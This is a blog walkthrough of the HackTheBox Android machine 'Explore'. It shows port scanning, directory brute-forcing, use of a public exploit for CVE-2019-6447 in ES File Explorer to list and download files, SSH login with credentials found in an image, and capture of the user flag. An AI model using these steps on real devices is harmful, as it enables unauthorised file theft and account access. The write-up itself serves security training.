<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Explore Machine :: Somesh&#39;s Blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content=" Solution to own HackTheBox Machine Explore (Android, Easy, 20 points)" />
<meta name="keywords" content="Android, CVE-2019-6447, Explore" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://somesh-banerjee.github.io/blogs/posts/explore/" />




<link rel="stylesheet" href="https://somesh-banerjee.github.io/blogs/assets/style.css">

  <link rel="stylesheet" href="https://somesh-banerjee.github.io/blogs/assets/green.css">






<link rel="apple-touch-icon" href="https://somesh-banerjee.github.io/blogs/img/apple-touch-icon-192x192.png">

  <link rel="shortcut icon" href="https://somesh-banerjee.github.io/blogs/img/favicon/green.png">



<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="https://twitter.com/banerjee_somesh" />
  
    <meta name="twitter:creator" content="banerjee_somesh" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Explore Machine">
<meta property="og:description" content=" Solution to own HackTheBox Machine Explore (Android, Easy, 20 points)" />
<meta property="og:url" content="https://somesh-banerjee.github.io/blogs/posts/explore/" />
<meta property="og:site_name" content="Somesh&#39;s Blog" />

  <meta property="og:image" content="https://somesh-banerjee.github.io/blogs/">

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2021-10-15 13:26:55 &#43;0530 IST" />












</head>
<body class="green">


<div class="container full headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/blogs/">
  <div class="logo">
    Somesh&#39;s Blog
  </div>
</a>

    </div>
    
      <div class="menu-trigger">menu</div>
    
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="https://somesh-banerjee.github.io/">About</a></li>
        
      
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="https://somesh-banerjee.github.io/">About</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="https://somesh-banerjee.github.io/blogs/posts/explore/">Explore Machine</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2021-10-15
        
      </span>
    
    
      <span class="post-author">:: Somesh Banerjee</span>
    
    
      <span class="post-reading-time">:: 6 min read (1078 words)</span>
    
  </div>

  
  <span class="post-tags">
    
    #<a href="https://somesh-banerjee.github.io/blogs/tags/infosec/">InfoSec</a>&nbsp;
    
    #<a href="https://somesh-banerjee.github.io/blogs/tags/hackthebox/">HackTheBox</a>&nbsp;
    
    #<a href="https://somesh-banerjee.github.io/blogs/tags/cve/">CVE</a>&nbsp;
    
  </span>
  
  


  

  <div class="post-content"><div>
        <p>OS: Android<br>
Points: 20<br>
Difficulty: Easy</p>
<p>ip = 10.10.10.247</p>
<h4 id="nmap-scan">nmap scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<pre tabindex="0"><code>PORT      STATE    SERVICE VERSION
2222/tcp  open     ssh     (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey:
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
4501/tcp  closed   unknown
5555/tcp  filtered freeciv
7135/tcp  closed   unknown
8705/tcp  closed   unknown
17330/tcp closed   unknown
17338/tcp closed   unknown
20873/tcp closed   unknown
25959/tcp closed   unknown
32381/tcp closed   unknown
33431/tcp closed   unknown
36745/tcp open     unknown
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 30 Jul 2021 04:28:38 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest:
|     HTTP/1.1 412 Precondition Failed
|     Date: Fri, 30 Jul 2021 04:28:38 GMT
|     Content-Length: 0
|   HTTPOptions:
|     HTTP/1.0 501 Not Implemented
|     Date: Fri, 30 Jul 2021 04:28:44 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 30 Jul 2021 04:29:02 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 30 Jul 2021 04:28:44 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 30 Jul 2021 04:29:02 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|     ?G???,???`~?
|     ??{????w????&lt;=?o?
|   TLSSessionReq:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 30 Jul 2021 04:29:03 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|     ??random1random2random3random4
|   TerminalServerCookie:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 30 Jul 2021 04:29:03 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|_    Cookie: mstshash=nmap
37712/tcp closed   unknown
38224/tcp closed   unknown
40415/tcp closed   unknown
42844/tcp closed   unknown
49627/tcp closed   unknown
51958/tcp closed   unknown
52854/tcp closed   unknown
55744/tcp closed   unknown
56823/tcp closed   unknown
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
60540/tcp closed   unknown
60600/tcp closed   unknown
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.91%I=7%D=7/30%Time=61037FF2%P=x86_64-pc-linux-gnu%r(NU
SF:LL,24,&quot;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&quot;);
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port36745-TCP:V=7.91%I=7%D=7/30%Time=61037FF2%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,AA,&quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x20
SF:30\x20Jul\x202021\x2004:28:38\x20GMT\r\nContent-Length:\x2022\r\nConten
SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
SF:r\nInvalid\x20request\x20line:\x20&quot;)%r(GetRequest,5C,&quot;HTTP/1\.1\x20412\
SF:x20Precondition\x20Failed\r\nDate:\x20Fri,\x2030\x20Jul\x202021\x2004:2
SF:8:38\x20GMT\r\nContent-Length:\x200\r\n\r\n&quot;)%r(HTTPOptions,B5,&quot;HTTP/1\
SF:.0\x20501\x20Not\x20Implemented\r\nDate:\x20Fri,\x2030\x20Jul\x202021\x
SF:2004:28:44\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pla
SF:in;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x2
SF:0supported:\x20OPTIONS&quot;)%r(RTSPRequest,BB,&quot;HTTP/1\.0\x20400\x20Bad\x20R
SF:equest\r\nDate:\x20Fri,\x2030\x20Jul\x202021\x2004:28:44\x20GMT\r\nCont
SF:ent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r
SF:\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version:
SF:\x20\x20RTSP/1\.0&quot;)%r(Help,AE,&quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
SF:te:\x20Fri,\x2030\x20Jul\x202021\x2004:29:02\x20GMT\r\nContent-Length:\
SF:x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection
SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP&quot;)%r(SSLSessionReq
SF:,DD,&quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x2030\x20Jul\x
SF:202021\x2004:29:02\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20
SF:text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\
SF:x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\?
SF:\0\?\?{\?\?\?\?w\?\?\?\?&lt;=\?o\?\x10n\0\0\(\0\x16\0\x13\0&quot;)%r(TerminalSe
SF:rverCookie,CA,&quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x203
SF:0\x20Jul\x202021\x2004:29:03\x20GMT\r\nContent-Length:\x2054\r\nContent
SF:-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r
SF:\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20msts
SF:hash=nmap&quot;)%r(TLSSessionReq,DB,&quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
SF:ate:\x20Fri,\x2030\x20Jul\x202021\x2004:29:03\x20GMT\r\nContent-Length:
SF:\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0
SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0&quot;);
</code></pre><h2 id="user">User<a href="#user" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>There is a http server running on port <code>57999</code>. Opening the page <code>http://10.10.10.247:59777/</code> on browser
gives the output</p>
<pre tabindex="0"><code>FORBIDDEN: No directory listing.
</code></pre><p>Using gobuster I tried to find other directories.<code>gobuster -u http://10.10.10.247:59777 -w /usr/share/wordlists/dirb/big.txt dir</code>, output:</p>
<pre tabindex="0"><code>/acct                 (Status: 301) [Size: 65] [--&gt; /acct/]
/bin                  (Status: 301) [Size: 63] [--&gt; /bin/]
/cache                (Status: 301) [Size: 67] [--&gt; /cache/]
/config               (Status: 301) [Size: 69] [--&gt; /config/]
/d                    (Status: 301) [Size: 59] [--&gt; /d/]
/data                 (Status: 301) [Size: 65] [--&gt; /data/]
/dev                  (Status: 301) [Size: 63] [--&gt; /dev/]
/etc                  (Status: 301) [Size: 63] [--&gt; /etc/]
/init                 (Status: 403) [Size: 31]
/lib                  (Status: 301) [Size: 63] [--&gt; /lib/]
/mnt                  (Status: 301) [Size: 63] [--&gt; /mnt/]
/oem                  (Status: 301) [Size: 63] [--&gt; /oem/]
/proc                 (Status: 301) [Size: 65] [--&gt; /proc/]
/product              (Status: 301) [Size: 71] [--&gt; /product/]
/sbin                 (Status: 301) [Size: 65] [--&gt; /sbin/]
/storage              (Status: 301) [Size: 71] [--&gt; /storage/]
/sys                  (Status: 301) [Size: 63] [--&gt; /sys/]
/system               (Status: 301) [Size: 69] [--&gt; /system/]
/vendor               (Status: 301) [Size: 69] [--&gt; /vendor/]
</code></pre><p>In all directories listing is forbidden. I tried to get any credentials. But <code>/etc/ssh</code> and  <code>/etc/passwd</code> are not available. For <code>/init</code> the reading of the file was forbidden. <code>/etc/hosts</code> was available and while going to that file <code>http://10.10.10.247:59777/etc/hosts</code>, it was getting downloaded.</p>
<p>So there are files in the machine and some which are readible to us. We have to <strong>explore files</strong> in the machine. Searching for &ldquo;explore file android exploits&rdquo;.</p>
<p>The first result is CVE-2019-6447. It will list all the files in android server and can get it. The port in the exploit is set to <code>59777</code>. Lets see exploits help</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">┌──(kali㉿kali)-[~/HTB/Explore]
└─$ python3 50070 help
USAGE 50070 &lt;command&gt; &lt;IP&gt; [file to download]
<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>┌──(kali㉿kali)-[~/HTB/Explore]
└─$ python3 50070 help 10.10.10.247                                                                            1 ⨯
[-] WRONG COMMAND!
Available commands :
  listFiles         : List all Files.
  listPics          : List all Pictures.
  listVideos        : List all videos.
  listAudios        : List all audios.
  listApps          : List Applications installed.
  listAppsSystem    : List System apps.
  listAppsPhone     : List Communication related apps.
  listAppsSdcard    : List apps on the SDCard.
  listAppsAll       : List all Application.
  getFile           : Download a file.
  getDeviceInfo     : Get device info.
</code></pre></div><p>I used all the commands available and see if I get anything useful.
Using <code>listPics</code> I get a image of credentials.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">┌──(kali㉿kali)-[~/HTB/Explore]
└─$ python3 50070 listPics 10.10.10.247                                                                        1 ⨯
<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================
<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>name : concept.jpg
time : 4/21/21 02:38:08 AM
location : /storage/emulated/0/DCIM/concept.jpg
size : 135.33 KB (138,573 Bytes)
<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>name : anc.png
time : 4/21/21 02:37:50 AM
location : /storage/emulated/0/DCIM/anc.png
size : 6.24 KB (6,392 Bytes)
<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>name : creds.jpg
time : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size : 1.14 MB (1,200,401 Bytes)
<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>name : 224_anc.png
time : 4/21/21 02:37:21 AM
location : /storage/emulated/0/DCIM/224_anc.png
size : 124.88 KB (127,876 Bytes)
<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>┌──(kali㉿kali)-[~/HTB/Explore]
└─$ python3 50070 getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg
<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================
<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>[+] Downloading file...
[+] Done. Saved as `out.dat`.
</code></pre></div><p>The image contains:</p>
<pre tabindex="0"><code>kristi
Kr1sT!5h@Rp3xPl0r3!
</code></pre><p>This is the credentials for ssh. Connecting through ssh</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">ssh kristi@10.10.10.247 -p 2222          
The authenticity of host &#39;[10.10.10.247]:2222 ([10.10.10.247]:2222)&#39; can&#39;t be established.
RSA key fingerprint is SHA256:3mNL574rJyHCOGm1e7Upx4NHXMg/YnJJzq+jXhdQQxI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &#39;[10.10.10.247]:2222&#39; (RSA) to the list of known hosts.
Password authentication
Password:
:/ $ ls
acct                   init.superuser.rc       sbin
bin                    init.usb.configfs.rc    sdcard
bugreports             init.usb.rc             sepolicy
cache                  init.zygote32.rc        storage
charger                init.zygote64_32.rc     sys
config                 lib                     system
d                      mnt                     ueventd.android_x86_64.rc
data                   odm                     ueventd.rc
default.prop           oem                     vendor
dev                    plat_file_contexts      vendor_file_contexts
etc                    plat_hwservice_contexts vendor_hwservice_contexts
fstab.android_x86_64   plat_property_contexts  vendor_property_contexts
init                   plat_seapp_contexts     vendor_seapp_contexts
init.android_x86_64.rc plat_service_contexts   vendor_service_contexts
init.environ.rc        proc                    vndservice_contexts
init.rc                product
:/ $ whoami
u0_a76
:/ $ cd s
sbin/     sdcard/   sepolicy  storage/  sys/      system/
:/ $ cd sdcard/
:/sdcard $ ls
Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt
Android Download Music  Pictures      Ringtones dianxinos
:/sdcard $ ca
cal             cameraserver    case            cat             catv
:/sdcard $ cat user.txt
f32017174c7c7e8f50c6da52891ae250
</code></pre></div>
      </div></div>

  

  
  

  
</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2023 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="https://somesh-banerjee.github.io/blogs/assets/main.js"></script>
<script src="https://somesh-banerjee.github.io/blogs/assets/prism.js"></script>







  
</div>

</body>
</html>
